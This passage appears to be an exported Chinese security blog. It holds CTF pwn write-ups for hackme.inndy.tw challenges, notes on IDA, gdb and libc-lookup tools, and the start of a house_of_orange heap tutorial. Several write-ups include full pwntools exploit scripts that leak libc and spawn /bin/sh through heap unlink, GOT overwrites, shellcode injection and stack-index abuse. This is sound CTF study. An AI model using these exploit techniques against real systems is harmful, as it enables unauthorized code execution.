1))(v3);//这里v0是menu返回的数字//它根据 note的show指针的地址 + v0 -1来确定函数的地址 note的结构： 123456struct note&#123; notepad_show *notepad_show; notepad_destroy *notepad_destroy; int flags; int n;&#125; 具体的思路： 先分配三个small bins大小的chunk，在第一个chunk中布置好 free_plt的地址，然后用notepad_open函数的漏洞，调用free_plt，将chunk2 free掉。这时只要delete掉chunk1，chunk1和chunk2就会进行unlink合并，将这个合并后的chunk申请回来，就可以对chunk2造成overlap，就可以控制chunk2的函数指针。利用printf函数泄露出libc的地址，最后再构成system(‘/bin/sh\x00’) 函数来getshell 先create三个0x60大小的chunk 123new(0x60,'aaaaa' + '\n')#chunk1new(0x60,'aaaaa' + '\n')#chunk2new(0x60,'aaaaa' + '\n')#chunk3 在chunk1中布置好free函数指针，调用notepad_open 使得chunk2被free掉 123payload = 'a'*0x5c + p32(elf.symbols['free'])open_y(0,payload+'\n')open_y(1,'aaaa\n','^')# '^' mean ord('a') - 3 delete掉chunk1，使chunk1和chunk2合并，再从堆中申请到合并后的chunk,布置好printf函数指针，泄露出libc地址 123456789delete(0)payload1 = 'a' * 0x5c + p32(elf.symbols['printf']) + 'aaaa'payload1 += 'a'*4 + '%1000$p\x00' + '\n'new(0xe0 - 16,payload1)open_n(1,'^')leak = int(p.recv(10),16)libc_base = leak - libc.symbols['_IO_2_1_stdin_']libc.address = libc_basesystem = libc.symbols['system'] delete 掉chunk1，布置好system函数，调用system函数 123456delete(0)payload2 = 'a'*0x5c + p32(system) + 'aaaa'payload2 += 'aaaa' + '/bin/sh\x00' + '\n'new(0xe0 - 16,payload2)open_n(1,'^')p.interactive() exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./notepad') elf = ELF('./notepad') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7713' p = remote(host,port) elf = ELF('./notepad') libc = ELF('./libc-2.23.so.i386')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))def new(size,content): ru("::&gt; ") sl('a') ru("size &gt; ") sl(str(size)) ru("data &gt; ") sd(content)def open_y(idx,content,flags = 'a'): ru("::&gt; ") sl('b') ru("id &gt; ") sl(str(idx)) ru("edit (Y/n)") sl("y") ru("content &gt; ") sd(content) rc() sl(flags)def open_n(idx,flags = 'a'): ru("::&gt; ") sl('b') ru("id &gt; ") sl(str(idx)) rc() sl("n") rc() sl(flags)def delete(idx): ru("::&gt; ") sl('c') rc() sl(str(idx))def setread(idx): ru("::&gt; ") sl('d') rc() sl(str(idx))def keepsec(idx): ru("::&gt; ") sl('e') rc() sl(str(idx))rc()sl('c')#gdb.attach(p,'b *0x08048CCD')new(0x60,'aaaaa' + '\n')#chunk1new(0x60,'aaaaa' + '\n')#chunk2new(0x60,'aaaaa' + '\n')#chunk3payload = 'a'*0x5c + p32(elf.symbols['free'])open_y(0,payload+'\n')open_y(1,'aaaa\n','^')delete(0)payload1 = 'a' * 0x5c + p32(elf.symbols['printf']) + 'aaaa'payload1 += 'a'*4 + '%1000$p\x00' + '\n'new(0xe0 - 16,payload1)open_n(1,'^')leak = int(p.recv(10),16)libc_base = leak - libc.symbols['_IO_2_1_stdin_']libc.address = libc_basesystem = libc.symbols['system']delete(0)payload2 = 'a'*0x5c + p32(system) + 'aaaa'payload2 += 'aaaa' + '/bin/sh\x00' + '\n'new(0xe0 - 16,payload2)open_n(1,'^')p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[onepunch writeup]]></title>
    <url>%2F2018%2F09%2F22%2F2018-9-22-onepunch-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 123456[*] &apos;/home/zs0zrc/pwn/Scoreboard/onepunch/onepunch&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 程序的ida反编译出来的代码很短： 1234567891011121314151617int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+8h] [rbp-18h] int v5; // [rsp+Ch] [rbp-14h] _BYTE *v6; // [rsp+10h] [rbp-10h] unsigned __int64 v7; // [rsp+18h] [rbp-8h] v7 = __readfsqword(0x28u); setbuf(_bss_start, 0LL); printf("Where What?", 0LL); v5 = __isoc99_scanf("%llx %d", &amp;v6, &amp;v4); if ( v5 != 2 ) return 0; *v6 = v4; if ( v4 == '\xFF' ) puts("No flag for you"); return 0; 程序要求输入一个地址，然后再往输入的地址写一个整数。然后再判断输入的整数是否等于255，如果等于就利用puts函数打印一句话然后退出。 这个程序只有一次任意地址写的机会，因为没有给不知道libc地址，所以写got表就不可行。在gdb调试时，发现 text段竟然具有可写的权限，所以可以通过patch程序来修改程序逻辑。 先修改程序逻辑，实现能循环读取 修改 0x400767处的 “jnz short loc_400773”为 “jnz_40071d” 1changeadd(0x400768,0xb4) 然后往0x400769处写入shellcode 123shellcode = asm(shellcraft.sh())for i in range(len(shellcode)): changeadd(0x400769+i,ord(shellcode[i])) exp: 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./onepunch') elf = ELF('./onepunch') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7718' p = remote(host,port) elf = ELF('./onepunch')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def changeadd(addr,content): ru("Where What?") p.sendline("&#123;&#125; &#123;&#125;".format(hex(addr),content))changeadd(0x400768,0xb4)shellcode = asm(shellcraft.sh())for i in range(len(shellcode)): changeadd(0x400769+i,ord(shellcode[i]))changeadd(0x400800,0xff)p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[leave_msg writeup]]></title>
    <url>%2F2018%2F09%2F22%2F2018-9-22-leave_msg-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 1234567[*] &apos;/home/zs0zrc/pwn/Scoreboard/leave_msg/leave_msg&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 只开启了Canary，没开NX，说明应该是要写shellcode 拖入ida反编译，发现程序的功能很简单。可以输入三次message，每次输入message后还要输入要插入的位置的下标slot。并且程序会对message的长度进行检查和输入的slot的大小进行检查。 对message长度的检查: 123456v3 = atoi(&amp;nptr); if ( strlen(&amp;buf) &gt; 8 ) &#123; puts("Message too long, truncated."); v6 = 0; &#125; 对slot大小的检查： 12345if ( v3 &lt;= 64 &amp;&amp; nptr != '-' ) dword_804A060[v3] = (int)strdup(&amp;buf); else puts("Out of bound.");&#125; 两个check都过了的话就将输入的message存到bss段的一个全局数组变量中去，存储的位置由输入的下标slot决定。这里只要绕过这两个check就可以改写got表的内容了。 strlen函数：它根据碰到的第一个’\0’来计算字符串的长度，所以可以在字符串前面加’\0’来绕过检查。 nptr != ‘-‘ 可以通过在’-‘符号前加一个空格来绕过 检查绕过后，可以修改got表 puts函数的内容为 ’add esp,0x36;jmp esp’来跳转到shellcode去，然后执行shellcode，这个0x38是调试出来的 10x36 = 0x30 + len(asm("add esp,0x36;jmp esp")) + 1 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#!/usr/bin/env pythonfrom pwn import *local = 1 if local: p = process('./leave_msg') elf = ELF('./leave_msg') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7715' p = remote(host,port) elf = ELF('./leave_msg')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))shellcode = asm("add esp,0x36;jmp esp")shellcode += '\x00'shellcode += asm(shellcraft.sh())ru("I'm busy. Please leave your message:\n")sd(shellcode)ru("Which message slot?\n")sd(' -16')p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDA的常见操作]]></title>
    <url>%2F2018%2F09%2F21%2F2018-9-21-ida%E7%9A%84%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[IDA-python的使用：常用的api 1234get_bytes(address,count)从address处读取count个字节的内容patch_bytes(address,buf),将adress地址处patch成buf的内容Xrefsto(address,flags=0) 找到所有引用了adress的地址byte(address) 获取address地址的一个字节的内容 一些IDA常用的快捷键： 跳转到特定地址 ： G 查询交叉引用： X 查找字符串： alt + t 拍摄快照：ctrl+shift+w 重新定义变量数据类型 : y undefine一个 函数： u create 一个函数：p ida反编译的一些技巧： 如果它函数反编译出来的变量很奇怪，可以将这个函数undefine掉然后再define，这样看的变量就会正常很多 如果反编译函数显示sp指针有问题，可以通过快捷键alt+k 在报错的地址修复sp指针 如果函数的结束地址正常，可以通过快捷键alt+p修改函数结束地址 可以变量转换数组，通过快捷键 y 将数据类型修改为 对应的类型的指针 例如 char *a1 ida远程调试linux上的程序先将ida文件夹下的linux_server64或者linux_server32拷到虚拟机去然后给它执行权限，同时将要调试的文件和它放在同意文件夹，然后设置ida使用remote debugger 设置相关的路径，就可以开始调试了 ida 之定义一个结构体在 edit 中选择 Add struct type 快捷键 是ins 设置struct的name，想要向结构体添加成员的话，点击 struct ends ，然后按D，就可以添加成员，再通过 N修改成员的名字，Y修改成员的类型 12345678910111213141516171800000000 ; Ins/Del : create/delete structure00000000 ; D/A/* : create structure member (data/ascii/array)00000000 ; N : rename structure or structure member00000000 ; U : delete structure member00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Sym. PRESS CTRL-NUMPAD+ TO EXPAND]00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Rela. PRESS CTRL-NUMPAD+ TO EXPAND]00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Dyn. PRESS CTRL-NUMPAD+ TO EXPAND]00000000 ; ---------------------------------------------------------------------------0000000000000000 struc_1 struc ; (sizeof=0x128, mappedto_6)00000000 name dq ? ; offset00000008 age dq ?00000010 description db 256 dup(?)00000110 align dq ?00000118 friends dq ? ; offset00000120 flags dq ?00000128 struc_1 ends00000128 如果想修改变量为struct的类型 ，就用 Y快捷键修改]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gdb常用命令]]></title>
    <url>%2F2018%2F09%2F20%2F2018-9-14-gdb%2F</url>
    <content type="text"><![CDATA[gdb 123456789101112基础调试命令s step，si步入n 执行下一条指令 ni步入b 在某处下断点，可以用b * adrressb function_nameinfo b 查看断点信息delete 删除所有断点c 继续r 执行disas addr 查看addr处前后的反汇编代码disas functions 参看fucntion函数的反汇编代码 显示内存数据1234567891011121314151617181920212223242526272829303132p 系列p system/main 显示某个函数地址p $esp 显示寄存器p/x p/a p/b p/s。。。p 0xff - 0xea 计算器print &amp;VarName 查看变量地址p * 0xffffebac 查看某个地址处的值x系列命令格式：x/&lt;n/f/u&gt; &lt;addr&gt; n是一个正整数，表示需要显示的内存单元的个数f 表示显示的格式(b字符，s字符串,i汇编指令,x十六进制，d十进制)u 表示从当前地址往后请求的字节数 默认4byte,u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字 节，g表示八字节&lt;addr&gt;表示一个内存地址x/xw addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表x/x $esp 查看esp寄存器中的值x/s addr 查看addr处的字符串x/b addr 查看addr处的字符x/i addr 查看addr处的反汇编结果info系列info register $ebp 查看寄存器ebp中的内容 (简写为 i r ebp)i r eflags 查看状态寄存器i r ss 查看段寄存器i b 查看断点信息i functions 查看所有的函数disas addr 查看addr处前后的反汇编代码stack 20 查看栈内20个值show args 查看参数vmmap 查看映射状况 peda带有readelf 查看elf文件中各个段的起始地址 peda带有parseheap 显示堆状况 peda带有 查找数据1234find 查找字符串 peda带有searchmem 查找字符串 peda带有ropsearch &quot;xor eax,eax;ret&quot; 0x08048080 0x08050000 查找某段的rop peda带有ropgadget 提供多个pop|ret可行结果 peda带有 Pwngdb插件123456789101112131415161718192021222324252627282930libc : Print the base address of libcld : Print the base address of ldcodebase : Print the base of code segmentheap : Print the base of heapgot : Print the Global Offset Table infomationdyn : Print the Dynamic section infomationfindcall : Find some function callbcall : Set the breakpoint at some function calltls : Print the thread local storage addressat : Attach by process namefindsyscall : Find the syscallfmtarg : Calculate the index of format stringYou need to stop on printf which has vulnerability.force : Calculate the nb in the house of force.heapinfo :打印heap的一些信息default is the arena of current threadIf tcache is enable, it would show infomation of tcache entryheapinfoall : Print some infomation of heap (all threads)arenainfo : Print some infomation of all arenachunkptr : 打印chunk的信息 后面加chunk返回给用户的地址printfastbin : 打印fastbin的链表信息tracemalloc on : 追踪程序chunk的malloc和freeparseheap :解析堆的布局magic : 打印出glibc中一些有用的信息fp : show FILE structurefp (Address of FILE)fpchain: show linked list of FILEorange : Test house of orange condition in the _IO_flush_lockporange (Address of FILE)glibc version &lt;= 2.23 pwndbg123456789top_chunk: 显示top chunk的信息malloc_chunk address:打印出已被分配的chunk的信息fastbins:显示fastbins链表信息unsorted:显示unsortedbin 的信息smallbins:显示smallbins的信息largebins:显示largebins的信息bins:显示所有bins的信息mp：显示一些内存管理用到的全局变量arena：显示分配区的信息]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[very_overflow writeup]]></title>
    <url>%2F2018%2F09%2F20%2F2018-9-22-very_overflow-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 123456[*] '/home/zs0zrc/pwn/Scoreboard/very_overflow/very_overflow' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 只开启了NX，并且程序是32位的。简单的运行了下，发现程序有4个功能。题目提供了源码就不用ida看了。这个程序模拟一个node的分配系统，但是没有用到堆，而是在栈上分配 node的结构体: 1234struct NOTE &#123; struct NOTE* next;//存储着下个note地址的指针 char data[128];&#125;; 程序的4个功能 12341) add node 新建一个node 2) edit node 对给定下标的node进行编辑3) show node 将给定下标的node的相关内容打印出来4) dump nodes 将全部note的相关内容打印出来 这个程序主要 漏洞存在 add 和 edit 功能上 add一个新 node时，它设置node-&gt;next的操作有问题,单独看是没什么问题的。 1node-&gt;next = (struct NOTE*)(node-&gt;data + strlen(node-&gt;data) + 1); edit用的是fgets函数，它读取的长度是固定的 12fgets(node-&gt;data, sizeof(node-&gt;data), stdin);//这里 sizeof(node-data) = 128// 如果创建的node的data大小比这个小，那么在edit时就会造成溢出，就可以修改下个node的next字段，达到任意地址读写的操作 具体思路： 1234利用edit的溢出修改下个node的next字段为got表的地址通过show功能打印出libc内地址在通过edit功能修改atoi函数在got表的内容为 system函数地址然后发送 &apos;/bin/sh\x00&apos;字符串 就可以getshell了 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./very_overflow') elf = ELF('./very_overflow') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7705' p = remote(host,port) elf = ELF('./very_overflow') libc = ELF('./libc-2.23.so.i386')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) def add(content): ru("Your action:") sl('1') ru("note: ") sd(content)def edit(idx,content): ru("Your action:") sl('2') ru(" edit: ") sl(str(idx)) ru("data: ") sd(content)def show(idx): ru("Your action:") sl('3') ru('Which note to show: ') sl(str(idx))add('a'*8+'\n')add('b'*8+'\n')add('c'*8+'\n')edit(0,'a'*0xa + p32(elf.got['__libc_start_main'])+'\n')show(2)ru("Next note: ")leak = int(p.recvline().strip('\n'),16)print hex(leak)libc_base = leak - 0x18540system = libc_base + libc.symbols['system']edit(2,p32(system)*3+'\n')rc()sl("$0")sl('5')p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用来泄露libc的一些工具]]></title>
    <url>%2F2018%2F09%2F20%2F2018-9-20-leak_libc%2F</url>
    <content type="text"><![CDATA[libc_database ./add 用来添加libc库 1./add /usr/lib/libc-2.21.so ./find 用来查找libc版本 12$ ./find printf 260archive-glibc (id libc6_2.19-10ubuntu2_i386) ./dump 用来输出libc中的一些函数的偏移 123456$ ./dump libc6_2.19-0ubuntu6.6_i386offset___libc_start_main_ret = 0x19a83offset_system = 0x00040190offset_dup2 = 0x000db590offset_recv = 0x000ed2d0offset_str_bin_sh = 0x160a24 LibcSearcher 一个基于libc_database写的python库例子12345678from LibcSearcher import *#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型obj = LibcSearcher(&quot;fgets&quot;, 0X7ff39014bd90)obj.dump(&quot;system&quot;) #system 偏移obj.dump(&quot;str_bin_sh&quot;) #/bin/sh 偏移obj.dump(&quot;__libc_start_main_ret&quot;) libc database search一个用来查询libc版本的网站 onegadget 一个神奇的工具 用来找libc中能一个gadget就get到shell的偏移 使用1one_gadget /lib/x86_64-linux-gnu/libc.so.6 info proc map 查看各个库加载信息然后寻找 “/bin/sh” 字符串strings: 查看文件中可见字符串strings -a -t x /lib32/libc.so.6 | grep “/bin/sh”objdump -d file | grep “ret” 可以用来查找ret指令objdump -x [filename] 打印头文件信息以及区段信息objdump -T libc.so | grep gets 我知道的就这么多了]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[stack writeup]]></title>
    <url>%2F2018%2F09%2F19%2F2018-9-19-stack-writeup%2F</url>
    <content type="text"><![CDATA[防护机制：全开 同时题目提供了一部分代码，通过阅读代码可以发现程序在模拟栈的PUSH和POP操作 1234567void stack_push(struct stack *s, int val) &#123; s-&gt;data[s-&gt;n++] = val;&#125;int stack_pop(struct stack *s) &#123; return s-&gt;data[--s-&gt;n];&#125; stack的结构体 1234struct stack &#123; int n; int data[64];&#125;; 通过ida反编译后查看代码 123456789101112131415int __cdecl stack_push(int *stack, int num)&#123; int result; // eax result = *stack; *stack += &amp;(&amp;GLOBAL_OFFSET_TABLE_)[4294967042] + 1; stack[result + 1] = num; return result;&#125;int __cdecl stack_pop(_DWORD *a1)&#123; *a1 += &amp;unk_1FBF + 0xFFFFE040; return *(&amp;dword_1FC4[-2032] + &amp;a1[*a1]);&#125; 不知道为什么我这反编译的东西看的这么奇怪，但是不管这个，程序没有对push或者pop的下标进行检查，所以可以先pop然后在push修改下标，就可以绕过canary，修改返回地址 push函数的汇编代码： 123456789101112131415161718192021.text:000006F0 stack_push proc near ; CODE XREF: main+DC↓p.text:000006F0.text:000006F0 stack = dword ptr 8.text:000006F0 num = dword ptr 0Ch.text:000006F0.text:000006F0 ; __unwind &#123;.text:000006F0 push ebp.text:000006F1 mov ebp, esp.text:000006F3 ; 4: result = *stack;.text:000006F3 call __x86_get_pc_thunk_ax.text:000006F8 add eax, 18C8h.text:000006FD mov eax, [ebp+stack]//n.text:00000700 mov eax, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax].text:00000702 ; 5: *stack += &amp;(&amp;GLOBAL_OFFSET_TABLE_)[4294967042] + 1;.text:00000702 lea ecx, (_GLOBAL_OFFSET_TABLE_+1 - 1FC0h)[eax].text:00000705 mov edx, [ebp+stack].text:00000708 mov [edx], ecx.text:0000070A ; 6: stack[result + 1] = num;.text:0000070A mov edx, [ebp+stack] //stack.text:0000070D mov ecx, [ebp+num] // number.text:00000710 mov [edx+eax*4+4], ecx 可以看到edx存放着stack结构体的地址，ecx存放着要进行操作的操作数，eax存放着要下标n pop函数汇编： 12345678910111213141516=&gt; 0x56555717 &lt;+0&gt;: push ebp 0x56555718 &lt;+1&gt;: mov ebp,esp 0x5655571a &lt;+3&gt;: call 0x56555917 &lt;__x86.get_pc_thunk.ax&gt; 0x5655571f &lt;+8&gt;: add eax,0x18a1 0x56555724 &lt;+13&gt;: mov eax,DWORD PTR [ebp+0x8] 0x56555727 &lt;+16&gt;: mov eax,DWORD PTR [eax] 0x56555729 &lt;+18&gt;: lea edx,[eax-0x1] 0x5655572c &lt;+21&gt;: mov eax,DWORD PTR [ebp+0x8] 0x5655572f &lt;+24&gt;: mov DWORD PTR [eax],edx 0x56555731 &lt;+26&gt;: mov eax,DWORD PTR [ebp+0x8] 0x56555734 &lt;+29&gt;: mov edx,DWORD PTR [eax] \\ n 0x56555736 &lt;+31&gt;: mov eax,DWORD PTR [ebp+0x8] \\ stack 0x56555739 &lt;+34&gt;: mov eax,DWORD PTR [eax+edx*4+0x4] \\ stack-&gt;data[--n] 0x5655573d &lt;+38&gt;: pop ebp 0x5655573e &lt;+39&gt;: ret End of assembler dump. 观察栈的内容 123456789101112131415161718192021222324252627282930313233343536pwndbg&gt; stack 9800:0000│ esp 0xffffce4c — 0x56555820 (main+225) — 0x8b10c48301:0004│ 0xffffce50 — 0xffffce68 — 0x002:0008│ 0xffffce54 — 0x4d203:000c│ 0xffffce58 — 0xf7ff5ac4 — jae 0xf7ff5b3f04:0010│ 0xffffce5c — 0x5655575a (main+27) — 0x1866c38105:0014│ 0xffffce60 — 0xf7ff39f3 — cmp al, 0x6d /* '&lt;main program&gt;' */06:0018│ 0xffffce64 — 0x4d207:001c│ eax 0xffffce68 — 0x0... ↓48:0120│ edi 0xffffcf6c — 0x69 /* 'i' */49:0124│ 0xffffcf70 — 0x04a:0128│ 0xffffcf74 — 0xffffd245 — 0x6d6f682f ('/hom')4b:012c│ 0xffffcf78 — 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) — 0x1b1db04c:0130│ 0xffffcf7c — 0xaf174d:0134│ 0xffffcf80 — 0xffffd245 — 0x6d6f682f ('/hom')4e:0138│ 0xffffcf84 — 0x2f /* '/' */4f:013c│ 0xffffcf88 — 0x5e /* '^' */50:0140│ 0xffffcf8c — 0x1651:0144│ 0xffffcf90 — 0x800052:0148│ 0xffffcf94 — 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) — 0x1b1db053:014c│ 0xffffcf98 — 0xf7fb4244 — 0xf7e1c020 (_IO_check_libio) — call 0xf7f23b5954:0150│ 0xffffcf9c — 0xf7e1c0ec (init_cacheinfo+92) — test eax, eax55:0154│ 0xffffcfa0 — 0x156:0158│ 0xffffcfa4 — 0x56556fc0 (_GLOBAL_OFFSET_TABLE_) — 0x1ee057:015c│ 0xffffcfa8 — 0x158:0160│ 0xffffcfac — 0xeb03c60059:0164│ 0xffffcfb0 — 0x15a:0168│ 0xffffcfb4 — 0xffffd074 — 0xffffd245 — 0x6d6f682f ('/hom')5b:016c│ 0xffffcfb8 — 0xffffd07c — 0xffffd26d — 0x53554244 ('DBUS')5c:0170│ 0xffffcfbc — 0xffffcfe0 — 0x15d:0174│ 0xffffcfc0 — 0x05e:0178│ 0xffffcfc4 — 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) — 0x1b1db05f:017c│ ebp 0xffffcfc8 — 0x060:0180│ 0xffffcfcc — 0xf7e1c637 (__libc_start_main+247) — add esp, 0x1061:0184│ 0xffffcfd0 — 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) — 0x1b1db0 返回地址存放着__libc_start_main + 247，可以通过这个泄露出libc地址，然后再覆盖返回地址为system函数地址，将对应参数写入栈中，这里写的地址要转换成int32的类型，不然会发生溢出 转换方法 ： 123func_addr = func_addr- (1&lt;&lt;32)orfunc_addr = func_addr - 0xffffffffff - 1 具体步骤： 1231.先pop一次，然后push &apos;93&apos;修改n为0x5d,也就是main函数的返回地址的对应的下标2.pop leak出libc的地址3.将system函数写入返回地址中，并且将参数写入对应的位置 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./stack') elf = ELF('./stack') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7716' p = remote(host,port) elf = ELF('./stack') libc = ELF('./libc-2.23.so.i386')context.arch = elf.archcontext.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))def push(number): rc() sl('i') sl(str(number))def pop(): rc() sl('p')pop()push('93')pop()ru("Pop -&gt; ")leak = int(p.recv(10))&amp;0xffffffffprint hex(leak)libc_base = leak - libc.symbols['__libc_start_main'] - 247print hex(libc_base)system = libc.symbols['system'] + libc_basebinsh = libc.search('/bin/sh\x00').next() + libc_basepush(str(system-(1&lt;&lt;32)))push('0')push(str(binsh-(1&lt;&lt;32)))sl('x')p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[house_of_orange]]></title>
    <url>%2F2018%2F09%2F19%2F2018-9-19-house_of_orange%2F</url>
    <content type="text"><![CDATA[今天学习了下house_of_orange,总算是把house_of_orange给搞懂了 house_of_orange原理其实很简单，就是利用unsorted bin attack 和_IO_FILE利用的结合 这里涉及到的知识点有点多，是堆利用和IO_FILE利用的结合，所以要对两者都有一定的了解 直接拿house_of_orange这道经典的题来说吧 防护机制： 基本程序逻辑：一共有三个功能 build 创建一个house 输入housename的长度、内容、price、color的一些信息，并且它的将house更新为最新分配的house，所以我们只能对刚分配的house进行操作 upgrade 更新house的内容，这里读取name时存在堆溢出漏洞 see 打印出house的信息 ，这里可以将地址leak出来 大致思路： 通过堆溢出，修改top chunk的大小，然后分配一个大小大于top chunk大小的chunk，所以 旧top chunk就会被free掉，进入unsorted bin中，然后再分配一个大小在large bin 的大小范围内的chunk，那么这个chunk就会包含libc的地址和它本身的地址，通过两次upgrade和see将libc地址和heap地址都泄露出来。之后通过堆溢出修改old top chunk的size字段为0x60，利用unsorted bin attack将 _IO_list_all修改为main_arena+0x58，同时old top chunk会被链入small bin中，如果再分配一个chunk，就会触发malloc_printerr，会遍历IO_llist_all，最终调用 IO_overflow函数，具体的下面会展开 首先这个题没有free功能，所以要想办法可以生成一个unsorted bins的chunk，这里是通过堆溢出，修改top chunk的大小，使它变小，这里要注意top chunk的size是有一些检查的，然后分配一个大小超出top chunk大小的chunk，这时根据申请的大小，会通过sysmalloc 来分配，如果申请的大小小于mmap的阀值的话，就会扩展top chunk，将old top chunk free掉，如果大于的话，就会通过mmap申请一块新的堆块。 sysmalloc源码： 1234567891011121314151617181920212223242526272829if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))/*这里进行判断，判断分配的大小是否大于mmap分配的阀值，如果大于就是用mmap从新分配一个堆块，否则就会扩展top chunk*/ &#123; char *mm; /* return value from mmap call*/ try_mmap: ......... .......... if (old_size != 0) &#123; /* Shrink old_top to insert fenceposts, keeping size a multiple of MALLOC_ALIGNMENT. We know there is at least enough space in old_top to do this. */ old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK; set_head (old_top, old_size | PREV_INUSE); set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE); set_head (chunk_at_offset (old_top, old_size + 2 * SIZE_SZ), (2 * SIZE_SZ) | PREV_INUSE); /* If possible, release the rest. */ if (old_size &gt;= MINSIZE) &#123; _int_free (av, old_top, 1);/*将old top chunk free掉，加入unsorted bin*/ &#125; &#125; ...........省略了挺多的 具体可以自己去看源码 能产生unsorted bin 之后，就要想着怎么泄露出libc地址了，libc地址很好泄露，但是heap的地址也要泄露出来，用于后面伪造_IO_FILE_plus结构体。这里的做法是，通过申请一个large bin大小的chunk，那么它的fd_nextsize和bk_nextsize中会存放自身的地址，通过这就可以泄露出堆地址 